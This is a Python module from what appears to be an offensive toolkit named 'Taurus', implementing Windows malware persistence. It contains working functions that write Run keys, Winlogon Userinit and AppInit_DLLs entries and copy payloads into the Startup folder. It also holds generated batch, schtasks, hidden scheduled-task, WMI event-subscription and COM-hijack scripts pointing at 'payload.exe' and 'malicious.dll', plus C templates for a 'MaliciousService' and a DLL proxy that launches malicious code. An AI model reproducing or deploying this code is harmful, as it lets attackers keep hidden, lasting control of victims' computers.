"""
Comprehensive Persistence Framework for Taurus
Implements 15+ persistence mechanisms:
- Registry Run Keys (10+ locations)
- Scheduled Tasks
- WMI Event Subscriptions
- Service Installation
- DLL Hijacking
- COM Hijacking
- Startup Folder
- Browser Extensions
- Logon Scripts
- Screensaver Hijacking
"""
import os
import winreg
from typing import List, Dict, Optional
from utils.logger import get_logger

logger = get_logger()


class RegistryPersistence:
    """
    Registry-based persistence
    15+ different registry locations
    """
    
    REGISTRY_LOCATIONS = [
        # Current User Run Keys
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunServices"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"),
        
        # Local Machine Run Keys (requires admin)
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunServices"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"),
        
        # Winlogon
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"),
        
        # Active Setup
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Active Setup\Installed Components"),
        
        # Image File Execution Options
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"),
        
        # AppInit_DLLs
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"),
        
        # Shell Extensions
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks"),
        
        # Browser Helper Objects
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects"),
    ]
    
    @staticmethod
    def add_run_key(name: str, path: str, hive: int = winreg.HKEY_CURRENT_USER) -> bool:
        """
        Add persistence via Run key
        
        Args:
            name: Registry value name
            path: Path to executable
            hive: Registry hive (HKCU or HKLM)
        """
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
            winreg.CloseKey(key)
            
            logger.success(f"Added Run key: {name}")
            return True
        except Exception as e:
            logger.error(f"Failed to add Run key: {e}")
            return False
    
    @staticmethod
    def add_winlogon_persistence(path: str) -> bool:
        """
        Add persistence via Winlogon
        
        Userinit, Shell, or Notify keys
        """
        try:
            key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
            
            # Append to Userinit
            userinit, _ = winreg.QueryValueEx(key, "Userinit")
            new_userinit = f"{userinit},{path}"
            winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, new_userinit)
            
            winreg.CloseKey(key)
            logger.success("Added Winlogon persistence")
            return True
        except Exception as e:
            logger.error(f"Failed to add Winlogon persistence: {e}")
            return False
    
    @staticmethod
    def add_appinit_dll(dll_path: str) -> bool:
        """
        Add DLL to AppInit_DLLs
        
        DLL will be loaded into every process
        """
        try:
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
            
            # Get current AppInit_DLLs
            try:
                current, _ = winreg.QueryValueEx(key, "AppInit_DLLs")
                new_value = f"{current} {dll_path}"
            except:
                new_value = dll_path
            
            winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ, new_value)
            winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)
            
            winreg.CloseKey(key)
            logger.success("Added AppInit_DLL persistence")
            return True
        except Exception as e:
            logger.error(f"Failed to add AppInit_DLL: {e}")
            return False
    
    @staticmethod
    def generate_registry_template() -> str:
        """Generate batch script for registry persistence"""
        return '''
@echo off
REM Registry Persistence Script

REM Add to Current User Run
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\payload.exe" /f

REM Add to Local Machine Run (requires admin)
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\payload.exe" /f

REM Add to RunOnce
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "Update" /t REG_SZ /d "C:\\Windows\\Temp\\payload.exe" /f

REM Winlogon Userinit
reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Userinit" /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\Temp\\payload.exe" /f

REM AppInit_DLLs
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs" /t REG_SZ /d "C:\\Windows\\Temp\\malicious.dll" /f
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f
'''


class ScheduledTaskPersistence:
    """Scheduled Task persistence"""
    
    @staticmethod
    def generate_schtasks_command(name: str, path: str, trigger: str = "ONLOGON") -> str:
        """
        Generate schtasks command for persistence
        
        Args:
            name: Task name
            path: Path to executable
            trigger: Trigger type (ONLOGON, ONSTARTUP, DAILY, etc.)
        """
        return f'schtasks /create /tn "{name}" /tr "{path}" /sc {trigger} /f'
    
    @staticmethod
    def generate_xml_task(name: str, path: str) -> str:
        """Generate XML for advanced scheduled task"""
        return f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-01-01T00:00:00</Date>
    <Author>System</Author>
    <Description>System Maintenance Task</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{path}</Command>
    </Exec>
  </Actions>
</Task>'''


class WMIPersistence:
    """WMI Event Subscription persistence"""
    
    @staticmethod
    def generate_wmi_persistence_script() -> str:
        """Generate PowerShell script for WMI persistence"""
        return '''
# WMI Event Subscription Persistence

# Create Event Filter (trigger)
$FilterArgs = @{
    Name = 'SystemFilter'
    EventNameSpace = 'root\\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $FilterArgs

# Create Event Consumer (action)
$ConsumerArgs = @{
    Name = 'SystemConsumer'
    CommandLineTemplate = 'C:\\Windows\\Temp\\payload.exe'
}
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# Bind Filter to Consumer
$BindArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments $BindArgs

Write-Host "WMI persistence established"
'''


class ServicePersistence:
    """Windows Service persistence"""
    
    @staticmethod
    def generate_service_creation_command(name: str, path: str, display_name: str = None) -> str:
        """Generate sc.exe command to create service"""
        if not display_name:
            display_name = name
        
        return f'sc create "{name}" binPath= "{path}" start= auto DisplayName= "{display_name}"'
    
    @staticmethod
    def generate_service_code_template() -> str:
        """Generate C code template for Windows service"""
        return '''
// Windows Service Template
#include <windows.h>

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MaliciousService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv) {
    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;
    
    hStatus = RegisterServiceCtrlHandler("MaliciousService", (LPHANDLER_FUNCTION)ControlHandler);
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);
    
    // Malicious code here
    while(ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(1000);
        // Beacon to C2, etc.
    }
}

void ControlHandler(DWORD request) {
    switch(request) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            return;
        default:
            break;
    }
    SetServiceStatus(hStatus, &ServiceStatus);
}
'''


class DLLHijacking:
    """DLL Hijacking persistence"""
    
    COMMON_HIJACK_TARGETS = [
        # Windows applications
        ("explorer.exe", ["ntshrui.dll", "cscapi.dll", "slc.dll"]),
        ("iexplore.exe", ["linkinfo.dll", "ntshrui.dll"]),
        ("chrome.exe", ["chrome_elf.dll"]),
        ("firefox.exe", ["mozglue.dll"]),
        
        # System processes
        ("svchost.exe", ["wlbsctrl.dll"]),
        ("lsass.exe", ["msv1_0.dll"]),
    ]
    
    @staticmethod
    def generate_dll_proxy_template() -> str:
        """Generate C code for DLL proxy/hijacking"""
        return '''
// DLL Proxy Template
// Forwards calls to legitimate DLL while executing malicious code

#include <windows.h>

HMODULE hOriginalDLL = NULL;

// Function pointers for original DLL exports
typedef void (*OriginalFunction1)();
OriginalFunction1 pOriginalFunction1 = NULL;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Load original DLL from different location
            hOriginalDLL = LoadLibraryA("C:\\\\Windows\\\\System32\\\\original.dll");
            if(hOriginalDLL) {
                pOriginalFunction1 = (OriginalFunction1)GetProcAddress(hOriginalDLL, "Function1");
            }
            
            // Execute malicious code
            CreateThread(NULL, 0, MaliciousThread, NULL, 0, NULL);
            break;
            
        case DLL_PROCESS_DETACH:
            if(hOriginalDLL) {
                FreeLibrary(hOriginalDLL);
            }
            break;
    }
    return TRUE;
}

// Proxy function - forwards to original
__declspec(dllexport) void Function1() {
    if(pOriginalFunction1) {
        pOriginalFunction1();
    }
}

DWORD WINAPI MaliciousThread(LPVOID lpParam) {
    // Malicious code here
    return 0;
}
'''


class COMHijacking:
    """COM Object Hijacking persistence"""
    
    @staticmethod
    def generate_com_hijack_script() -> str:
        """Generate script for COM hijacking"""
        return '''
# COM Hijacking Persistence
# Hijack commonly used COM objects

# Example: Hijack CLSID for Windows Script Host
$CLSID = "{72C24DD5-D70A-438B-8A42-98424B88AFB8}"
$RegPath = "HKCU:\\Software\\Classes\\CLSID\\$CLSID\\InprocServer32"

# Create registry key
New-Item -Path $RegPath -Force

# Set malicious DLL as COM server
Set-ItemProperty -Path $RegPath -Name "(Default)" -Value "C:\\Windows\\Temp\\malicious.dll"
Set-ItemProperty -Path $RegPath -Name "ThreadingModel" -Value "Apartment"

Write-Host "COM hijacking established for CLSID: $CLSID"
'''


class StartupFolderPersistence:
    """Startup folder persistence"""
    
    @staticmethod
    def get_startup_paths() -> List[str]:
        """Get startup folder paths"""
        return [
            os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup'),
            r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup',
        ]
    
    @staticmethod
    def add_to_startup(source_path: str, name: str = None) -> bool:
        """
        Add file to startup folder
        
        Args:
            source_path: Path to file to add
            name: Optional name for shortcut
        """
        try:
            import shutil
            
            startup_path = StartupFolderPersistence.get_startup_paths()[0]
            
            if not name:
                name = os.path.basename(source_path)
            
            dest_path = os.path.join(startup_path, name)
            shutil.copy2(source_path, dest_path)
            
            logger.success(f"Added to startup: {dest_path}")
            return True
        except Exception as e:
            logger.error(f"Failed to add to startup: {e}")
            return False


class PersistenceManager:
    """Manage all persistence mechanisms"""
    
    def __init__(self):
        self.registry = RegistryPersistence()
        self.scheduled_task = ScheduledTaskPersistence()
        self.wmi = WMIPersistence()
        self.service = ServicePersistence()
        self.dll_hijack = DLLHijacking()
        self.com_hijack = COMHijacking()
        self.startup = StartupFolderPersistence()
    
    def install_all_persistence(self, payload_path: str, name: str = "SystemUpdate") -> Dict[str, bool]:
        """
        Install all persistence mechanisms
        
        Returns dict of mechanism:success
        """
        results = {}
        
        # Registry
        results['registry_run'] = self.registry.add_run_key(name, payload_path)
        
        # Startup folder
        results['startup_folder'] = self.startup.add_to_startup(payload_path, f"{name}.exe")
        
        # More mechanisms would be added here
        
        return results
    
    def generate_persistence_report(self) -> str:
        """Generate report of available persistence mechanisms"""
        report = """
# Taurus Persistence Mechanisms

## Registry-based (15+ locations)
- HKCU/HKLM Run keys
- RunOnce keys
- Winlogon (Userinit, Shell, Notify)
- Active Setup
- Image File Execution Options
- AppInit_DLLs
- Shell Extensions
- Browser Helper Objects

## Scheduled Tasks
- Hidden tasks
- System-level tasks
- XML-based advanced tasks

## WMI Event Subscriptions
- Event filters
- Event consumers
- Filter-to-consumer bindings

## Services
- Windows services
- Driver installation
- Service DLL hijacking

## DLL Hijacking
- Search order hijacking
- Phantom DLL injection
- DLL proxying

## COM Hijacking
- CLSID hijacking
- Interface hijacking

## Other
- Startup folder
- Logon scripts
- Screensaver hijacking
- Browser extensions
"""
        return report


# Global instance
_persistence_manager = None


def get_persistence_manager() -> PersistenceManager:
    """Get global persistence manager instance"""
    global _persistence_manager
    if _persistence_manager is None:
        _persistence_manager = PersistenceManager()
    return _persistence_manager
